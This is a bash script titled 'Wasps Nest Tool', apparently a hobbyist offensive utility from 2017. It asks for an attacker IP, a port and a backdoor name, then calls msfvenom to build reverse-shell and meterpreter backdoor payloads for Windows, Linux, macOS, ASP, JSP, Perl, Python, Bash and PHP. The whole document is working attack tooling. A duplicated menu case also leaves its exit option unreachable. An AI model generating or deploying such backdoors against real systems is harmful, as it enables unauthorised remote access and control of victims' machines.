#!/bin/bash
clear
echo
cat << "EOF"
                 _  _
                | )/ )
             \\ |//,' __
             (")(_)-"()))=-
                (\\
                             _   _
  HEELP                     ( | / )
                          \\ \|/,' __
    \_o_/                 (")(_)-"()))=-
       )                     <\\
      /\__
_____ \ ________________________________
__      ____ _ ___ _ __  
\ \ /\ / / _` / __| '_ \ 
 \ V  V / (_| \__ \ |_) |
  \_/\_/ \__,_|___/ .__/ 
                  | |    
                  |_|    
EOF
echo
echo -e "\e[1;31m:::::::Wasps Nest Tool v.0 2017:::::::.\e[0m"
echo "                                              c0ded by sup3r."
echo -e "\e[1;31mPlease enter Your Ip:\e[0m"
read lip
echo -e "\e[1;31mPlease enter reverse Port:\e[0m"
read lport
echo -e "\e[1;31mPlease enter reverse backdoor name:\e[0m"
read bkname
mkdir -p payloads
echo
echo -e "\e[1;32m1. Payload Windows[$bkname.Exe] .\e[0m"
echo -e "\e[1;32m2. Payload Linux Binaries[$bkname.Elf] .\e[0m"
echo -e "\e[1;32m3. Payload Mac[$bkname.Macho] .\e[0m"
echo -e "\e[1;32m4. Payload ASP [$bkname.Asp] .\e[0m"
echo -e "\e[1;32m5. Payload JSP [$bkname.jsp] .\e[0m"
echo -e "\e[1;32m6. Payload Perl [$bkname.pl] .\e[0m"
echo -e "\e[1;32m7. Payload Python [$bkname.py] .\e[0m"
echo -e "\e[1;32m8. Payload Bash [$bkname.sh] .\e[0m"
echo -e "\e[1;32m9. Payload Php [$bkname.php].\e[0m"
echo -e "\e[1;32m10. main.\e[0m"
echo -e "\e[1;32m11. Exit.\e[0m"
echo
echo -e "\e[1;36m1. Choice.\e[0m"
read choice
echo $choice
case $choice in
     1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > payloads/$bkname.exe ;;
     2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > payloads/$bkname.elf ;;
     3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > payloads/$bkname.macho ;;
     4) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f asp > payloads/$bkname.asp ;;
     5) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.jsp ;;
     6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.pl ;;
     7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.py ;;
     8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.sh ;;
     9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > payloads/$bkname.php ;;
     10) ./main.sh ;;
     10) exit ;;
     *) echo; echo "Invalid choice."; echo
esac